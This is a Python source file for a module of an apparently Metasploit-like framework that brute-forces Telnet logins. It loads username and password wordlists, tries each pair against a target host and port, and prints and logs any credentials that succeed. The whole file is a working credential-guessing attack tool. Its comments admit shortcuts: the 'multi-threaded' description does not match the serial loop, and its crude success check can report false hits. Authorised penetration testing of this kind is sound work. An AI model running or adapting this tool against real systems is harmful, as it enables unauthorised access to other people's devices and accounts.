import asyncio
import telnetlib3
from rich.console import Console
from utils.logger import log_action

console = Console()

class Module:
    MODULE_INFO = {
        'name': 'auxiliary/telnet_bruteforce',
        'description': 'Multi-threaded Telnet bruteforce module.',
        'options': {
            'RHOST': 'Target IP address',
            'RPORT': 'Target port [default: 23]',
            'USER_FILE': 'Path to username wordlist [default: wordlists/usernames.txt]',
            'PASS_FILE': 'Path to password wordlist [default: wordlists/passwords.txt]',
            'THREADS': 'Number of concurrent attempts [default: 5]'
        }
    }

    def __init__(self, framework):
        self.framework = framework

    async def attempt_login(self, host, port, user, password):
        try:
            reader, writer = await asyncio.wait_for(
                telnetlib3.open_connection(host, port), 
                timeout=5
            )
            # This is a simplified telnet login logic
            # Many telnet servers have different prompts.
            # Real-world tools use more complex state machines.
            writer.write(user + '\r\n')
            await asyncio.sleep(0.5)
            writer.write(password + '\r\n')
            await asyncio.sleep(1)
            
            output = await reader.read(1024)
            if any(term in output.lower() for term in ['incorrect', 'failed', 'login']):
                return False
            return True
        except:
            return False

    def run(self):
        rhost = self.framework.options.get('RHOST')
        rport = int(self.framework.options.get('RPORT', 23))
        user_file = self.framework.options.get('USER_FILE', 'wordlists/usernames.txt')
        pass_file = self.framework.options.get('PASS_FILE', 'wordlists/passwords.txt')

        if not rhost:
            console.print("[red][!] RHOST is required.[/red]")
            return

        try:
            with open(user_file, 'r') as f:
                usernames = [line.strip() for line in f if line.strip()]
            with open(pass_file, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError as e:
            console.print(f"[red][!] Wordlist not found: {e}[/red]")
            return

        console.print(f"[*] Starting Telnet bruteforce on [cyan]{rhost}:{rport}[/cyan]...")
        
        # In a real implementation, we'd use a semaphore for threading
        # For now, let's do a simple loop (or a small async batch)
        found = False
        for user in usernames:
            for password in passwords:
                console.print(f"[*] Trying [yellow]{user}:{password}[/yellow]...")
                if asyncio.run(self.attempt_login(rhost, rport, user, password)):
                    console.print(f"[bold green][+] Success! Credentials: {user}:{password}[/bold green]")
                    log_action(f"Telnet success on {rhost}: {user}:{password}")
                    found = True
                    break
            if found: break

        if not found:
            console.print("[yellow][!] Bruteforce finished. No credentials found.[/yellow]")
